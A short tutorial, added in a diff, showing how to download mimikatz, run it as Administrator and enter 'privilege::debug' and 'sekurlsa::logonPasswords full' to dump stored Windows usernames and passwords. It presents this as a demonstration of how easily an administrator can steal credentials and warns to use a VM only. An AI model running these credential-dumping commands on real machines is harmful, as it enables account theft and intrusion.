@@ -1,0 +1,24 @@
+= mimikatz - copy, paste, GO!
+
+
+This tutorial is meant to show how easy it is to steal credentials from a local machine if you have administrative control of that machine.
+
+WARNING: *Only do this in a VM! Do not download mimikatz on a work computer.*
+
+Download mimikatz
+
+https://github.com/gentilkiwi/mimikatz/releases
+
+Extract mimikatz
+
+Execute the mimikatz.exe binary as Administrator.
+
+Within the mimikatz window enter the following commands:
+
+ $ privilege::debug
+
+ $ sekurlsa::logonPasswords full
+
+This should display a list of all the usernames and passwords that are stored on the computer.
+
+
